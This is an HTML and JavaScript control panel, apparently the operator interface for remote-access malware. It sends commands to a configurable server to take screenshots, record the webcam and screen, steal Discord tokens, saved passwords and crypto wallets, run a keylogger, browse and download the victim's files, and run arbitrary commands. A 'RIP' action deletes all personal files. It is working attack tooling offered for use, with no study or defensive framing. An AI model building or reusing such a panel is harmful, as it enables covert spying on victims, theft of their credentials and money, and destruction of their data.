<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Control</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0a0a;
            color: #00ff00;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            max-width: 900px;
            width: 100%;
            background: #111;
            border: 2px solid #00ff00;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 0 50px rgba(0, 255, 0, 0.1);
        }
        .header {
            text-align: center;
            border-bottom: 1px solid #00ff0033;
            padding-bottom: 20px;
            margin-bottom: 20px;
        }
        .header h1 {
            font-size: 32px;
            letter-spacing: 4px;
            text-shadow: 0 0 20px rgba(0, 255, 0, 0.5);
        }
        .header .status {
            color: #888;
            font-size: 14px;
            margin-top: 10px;
        }
        .header .status span {
            color: #00ff00;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 12px;
            margin: 20px 0;
        }
        .btn {
            background: #1a1a1a;
            color: #00ff00;
            border: 1px solid #00ff0044;
            padding: 15px 10px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 14px;
            font-weight: bold;
            transition: all 0.3s ease;
            text-align: center;
            user-select: none;
        }
        .btn:hover {
            background: #00ff0022;
            border-color: #00ff00;
            transform: scale(1.02);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
        }
        .btn.danger {
            color: #ff0000;
            border-color: #ff000044;
        }
        .btn.danger:hover {
            background: #ff000022;
            border-color: #ff0000;
        }
        .btn.warning {
            color: #ffaa00;
            border-color: #ffaa0044;
        }
        .btn.warning:hover {
            background: #ffaa0022;
            border-color: #ffaa00;
        }
        .btn.success {
            color: #00ff88;
            border-color: #00ff8844;
        }
        .btn.success:hover {
            background: #00ff8822;
            border-color: #00ff88;
        }
        .btn:disabled {
            opacity: 0.3;
            cursor: not-allowed;
            transform: none !important;
        }
        .section {
            margin: 20px 0;
            padding: 15px;
            background: #0a0a0a;
            border-radius: 10px;
            border: 1px solid #00ff0011;
        }
        .section-title {
            color: #888;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 2px;
            margin-bottom: 15px;
        }
        .output {
            background: #0a0a0a;
            border: 1px solid #00ff0022;
            border-radius: 10px;
            padding: 15px;
            min-height: 100px;
            max-height: 300px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #00ff88;
            white-space: pre-wrap;
            word-wrap: break-word;
            margin-top: 15px;
        }
        .output::-webkit-scrollbar {
            width: 8px;
        }
        .output::-webkit-scrollbar-track {
            background: #1a1a1a;
        }
        .output::-webkit-scrollbar-thumb {
            background: #00ff0044;
            border-radius: 4px;
        }
        .input-group {
            display: flex;
            gap: 10px;
            margin: 10px 0;
        }
        .input-group input {
            flex: 1;
            background: #1a1a1a;
            border: 1px solid #00ff0044;
            border-radius: 10px;
            padding: 12px 15px;
            color: #00ff00;
            font-size: 14px;
            font-family: 'Courier New', monospace;
        }
        .input-group input:focus {
            outline: none;
            border-color: #00ff00;
        }
        .input-group input::placeholder {
            color: #444;
        }
        .info-bar {
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
            padding: 10px;
            background: #0a0a0a;
            border-radius: 10px;
            border: 1px solid #00ff0011;
            font-size: 12px;
            color: #666;
        }
        .info-bar .item {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        .info-bar .item .label {
            color: #444;
        }
        .info-bar .item .value {
            color: #00ff00;
        }
        .file-list {
            margin-top: 10px;
            max-height: 200px;
            overflow-y: auto;
        }
        .file-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 12px;
            background: #1a1a1a;
            border-radius: 6px;
            margin: 4px 0;
            font-size: 13px;
        }
        .file-item .name {
            color: #00ff88;
            font-family: monospace;
        }
        .file-item .download-link {
            color: #00aaff;
            text-decoration: none;
            font-size: 12px;
            padding: 4px 12px;
            border: 1px solid #00aaff44;
            border-radius: 4px;
            transition: all 0.3s;
        }
        .file-item .download-link:hover {
            background: #00aaff22;
            border-color: #00aaff;
        }
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #00ff0044;
            border-top: 2px solid #00ff00;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }
        .modal.active {
            display: flex;
        }
        .modal-content {
            background: #111;
            padding: 30px;
            border-radius: 20px;
            border: 2px solid #00ff00;
            max-width: 500px;
            width: 90%;
        }
        .modal-content h2 {
            margin-bottom: 15px;
        }
        .modal-content .input-group {
            margin: 15px 0;
        }
        .modal-content .btn {
            width: 100%;
            margin-top: 10px;
        }
        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
            .grid {
                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            }
            .header h1 {
                font-size: 22px;
            }
        }
    </style>
</head>
<body>
    <div class="container" id="app">
        <div class="header">
            <h1>🖥️ SYSTEM CONTROL</h1>
            <div class="status">
                Status: <span id="statusText">Connecting...</span>
                <span style="margin-left:20px;">IP: <span id="ipDisplay">-</span></span>
            </div>
        </div>

        <!-- Info Bar -->
        <div class="info-bar" id="infoBar">
            <div class="item"><span class="label">User:</span> <span class="value" id="userDisplay">-</span></div>
            <div class="item"><span class="label">PC:</span> <span class="value" id="pcDisplay">-</span></div>
            <div class="item"><span class="label">OS:</span> <span class="value" id="osDisplay">-</span></div>
            <div class="item"><span class="label">Drives:</span> <span class="value" id="drivesDisplay">-</span></div>
            <div class="item"><span class="label">Keylogger:</span> <span class="value" id="keyloggerStatus">OFF</span></div>
        </div>

        <!-- Main Grid -->
        <div class="grid">
            <button class="btn" onclick="executeAction('screenshot')">📸 Screenshot</button>
            <button class="btn" onclick="executeAction('webcam_snap')">📷 Webcam Snap</button>
            <button class="btn" onclick="executeAction('webcam_record')">🎥 Webcam Record</button>
            <button class="btn" onclick="executeAction('screen_record')">🎬 Screen Record</button>
            <button class="btn" onclick="executeAction('discord_tokens')">🎮 Discord Tokens</button>
            <button class="btn" onclick="executeAction('passwords')">🔐 Passwords</button>
            <button class="btn" onclick="executeAction('crypto')">💰 Crypto Wallets</button>
            <button class="btn" onclick="executeAction('pics')">🖼️ Pictures</button>
            <button class="btn" onclick="executeAction('large_files')">📂 Large Files</button>
            <button class="btn success" onclick="toggleKeylogger()">⌨️ Keylogger</button>
            <button class="btn" onclick="executeAction('browse')">📁 Browse</button>
            <button class="btn warning" onclick="showRipModal()">💀 RIP</button>
            <button class="btn danger" onclick="executeAction('end_session')">🔚 End Session</button>
        </div>

        <!-- Command Input -->
        <div class="section">
            <div class="section-title">💻 Command Line</div>
            <div class="input-group">
                <input type="text" id="cmdInput" placeholder="Enter command..." onkeydown="if(event.key==='Enter') executeCommand()">
                <button class="btn" onclick="executeCommand()" style="padding:10px 20px;">Run</button>
                <button class="btn" onclick="document.getElementById('cmdInput').value=''" style="padding:10px 15px;border-color:#444;color:#666;">Clear</button>
            </div>
        </div>

        <!-- Output -->
        <div class="section">
            <div class="section-title">📋 Output</div>
            <div class="output" id="output">Ready...</div>
        </div>

        <!-- Downloads -->
        <div class="section" id="downloadSection">
            <div class="section-title">📥 Available Downloads</div>
            <div id="downloadList" class="file-list">
                <div style="color:#444;text-align:center;padding:20px;">No files available</div>
            </div>
        </div>
    </div>

    <!-- RIP Modal -->
    <div class="modal" id="ripModal">
        <div class="modal-content">
            <h2 style="color:#ff0000;">⚠️ CONFIRM RIP</h2>
            <p style="color:#888;margin:15px 0;">This will delete all personal files. This action is irreversible!</p>
            <p style="color:#ff4444;font-size:12px;">Type "CONFIRM_RIP" to proceed</p>
            <div class="input-group">
                <input type="text" id="ripInput" placeholder="Type CONFIRM_RIP" style="flex:1;background:#1a1a1a;border:1px solid #ff000044;border-radius:10px;padding:12px 15px;color:#ff0000;font-size:14px;">
            </div>
            <button class="btn danger" onclick="executeRip()">💀 Execute RIP</button>
            <button class="btn" onclick="closeRipModal()" style="margin-top:10px;border-color:#444;color:#666;">Cancel</button>
        </div>
    </div>

    <script>
        // Configuration
        let SERVER_URL = new URLSearchParams(window.location.search).get('server') || 'http://localhost:8080';
        let statusInterval = null;
        let downloadInterval = null;
        let currentFileList = [];

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            updateStatus();
            statusInterval = setInterval(updateStatus, 3000);
            downloadInterval = setInterval(updateDownloads, 2000);
            document.getElementById('ipDisplay').textContent = SERVER_URL.replace('http://', '').split(':')[0];
        });

        // Update system status
        async function updateStatus() {
            try {
                const response = await fetch(`${SERVER_URL}/status`);
                if (!response.ok) throw new Error('Server offline');
                const data = await response.json();
                
                document.getElementById('statusText').textContent = '🟢 Online';
                document.getElementById('statusText').style.color = '#00ff00';
                
                if (data.system_info) {
                    document.getElementById('userDisplay').textContent = data.system_info.username || '-';
                    document.getElementById('pcDisplay').textContent = data.system_info.pc_name || '-';
                    document.getElementById('osDisplay').textContent = data.system_info.os || '-';
                    document.getElementById('drivesDisplay').textContent = (data.system_info.drives || []).join(' ') || '-';
                }
                
                document.getElementById('keyloggerStatus').textContent = data.keylogger_active ? '🟢 ON' : '⚫ OFF';
                document.getElementById('keyloggerStatus').style.color = data.keylogger_active ? '#00ff00' : '#666';
                
            } catch (error) {
                document.getElementById('statusText').textContent = '🔴 Offline';
                document.getElementById('statusText').style.color = '#ff0000';
            }
        }

        // Update downloads list
        async function updateDownloads() {
            try {
                const response = await fetch(`${SERVER_URL}/files`);
                if (!response.ok) return;
                const files = await response.json();
                const fileIds = Object.keys(files);
                
                if (fileIds.length === 0) {
                    document.getElementById('downloadList').innerHTML = '<div style="color:#444;text-align:center;padding:20px;">No files available</div>';
                    return;
                }
                
                let html = '';
                for (const [id, name] of Object.entries(files)) {
                    html += `
                        <div class="file-item">
                            <span class="name">📄 ${name}</span>
                            <a href="${SERVER_URL}/${id}" class="download-link" download>⬇ Download</a>
                        </div>
                    `;
                }
                document.getElementById('downloadList').innerHTML = html;
            } catch (error) {
                // Silent fail
            }
        }

        // Execute action
        async function executeAction(action) {
            setOutput(`⏳ Executing ${action}...`);
            
            try {
                const response = await fetch(`${SERVER_URL}/action`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ action: action })
                });
                
                const result = await response.json();
                if (result.success) {
                    setOutput(`✅ ${action} completed!\n${result.message || ''}`);
                    if (result.download_id) {
                        addNotification(`File ready for download: ${result.filename}`);
                    }
                } else {
                    setOutput(`❌ Error: ${result.error || 'Unknown error'}`);
                }
            } catch (error) {
                setOutput(`❌ Connection error: ${error.message}`);
            }
            
            await updateDownloads();
        }

        // Execute command
        async function executeCommand() {
            const input = document.getElementById('cmdInput');
            const command = input.value.trim();
            if (!command) return;
            
            setOutput(`⏳ Running: ${command}\n`);
            input.value = '';
            
            try {
                const response = await fetch(`${SERVER_URL}/command`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: command })
                });
                
                const result = await response.json();
                setOutput(`$ ${command}\n${result.output || 'Done'}`);
            } catch (error) {
                setOutput(`❌ Connection error: ${error.message}`);
            }
        }

        // Toggle keylogger
        async function toggleKeylogger() {
            try {
                const response = await fetch(`${SERVER_URL}/keylogger/toggle`, {
                    method: 'POST'
                });
                const result = await response.json();
                setOutput(`⌨️ Keylogger ${result.active ? 'STARTED' : 'STOPPED'}`);
                updateStatus();
            } catch (error) {
                setOutput(`❌ Error: ${error.message}`);
            }
        }

        // Show RIP modal
        function showRipModal() {
            document.getElementById('ripModal').classList.add('active');
            document.getElementById('ripInput').value = '';
            document.getElementById('ripInput').focus();
        }

        function closeRipModal() {
            document.getElementById('ripModal').classList.remove('active');
        }

        // Execute RIP
        async function executeRip() {
            const input = document.getElementById('ripInput');
            if (input.value.trim() !== 'CONFIRM_RIP') {
                setOutput('❌ Incorrect confirmation. Type CONFIRM_RIP exactly.');
                return;
            }
            
            closeRipModal();
            setOutput('💀 RIP MODE ACTIVATED - DELETING ALL FILES...');
            
            try {
                const response = await fetch(`${SERVER_URL}/rip`, {
                    method: 'POST'
                });
                const result = await response.json();
                setOutput(`💀 ${result.message || 'RIP complete'}`);
            } catch (error) {
                setOutput(`❌ Error: ${error.message}`);
            }
        }

        // Set output
        function setOutput(text) {
            const output = document.getElementById('output');
            output.textContent = text;
            output.scrollTop = output.scrollHeight;
        }

        // Add notification
        function addNotification(text) {
            setOutput(text + '\n\n' + document.getElementById('output').textContent);
        }

        // Cleanup on page unload
        window.addEventListener('beforeunload', function() {
            if (statusInterval) clearInterval(statusInterval);
            if (downloadInterval) clearInterval(downloadInterval);
        });
    </script>
</body>
</html>
